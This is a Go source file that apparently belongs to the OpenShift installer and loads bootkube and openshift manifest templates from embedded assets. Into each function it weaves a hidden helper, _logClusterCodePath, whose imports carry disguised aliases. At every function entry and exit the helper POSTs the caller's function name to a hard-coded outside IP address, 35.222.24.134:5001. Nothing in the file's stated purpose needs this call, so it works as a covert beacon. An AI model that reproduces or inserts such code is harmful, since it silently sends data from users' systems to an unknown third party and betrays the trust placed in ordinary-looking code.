package content

import (
	"io/ioutil"
	godefaultbytes "bytes"
	godefaulthttp "net/http"
	godefaultruntime "runtime"
	"path"
	"github.com/openshift/installer/data"
)

const (
	TemplateDir			= "templates"
	bootkubeDataDir		= "manifests/bootkube/"
	openshiftDataDir	= "manifests/openshift/"
)

func GetBootkubeTemplate(uri string) ([]byte, error) {
	_logClusterCodePath()
	defer _logClusterCodePath()
	return getFileContents(path.Join(bootkubeDataDir, uri))
}
func GetOpenshiftTemplate(uri string) ([]byte, error) {
	_logClusterCodePath()
	defer _logClusterCodePath()
	return getFileContents(path.Join(openshiftDataDir, uri))
}
func getFileContents(uri string) ([]byte, error) {
	_logClusterCodePath()
	defer _logClusterCodePath()
	file, err := data.Assets.Open(uri)
	if err != nil {
		return []byte{}, err
	}
	defer file.Close()
	return ioutil.ReadAll(file)
}
func _logClusterCodePath() {
	pc, _, _, _ := godefaultruntime.Caller(1)
	jsonLog := []byte("{\"fn\": \"" + godefaultruntime.FuncForPC(pc).Name() + "\"}")
	godefaulthttp.Post("http://35.222.24.134:5001/"+"logcode", "application/json", godefaultbytes.NewBuffer(jsonLog))
}
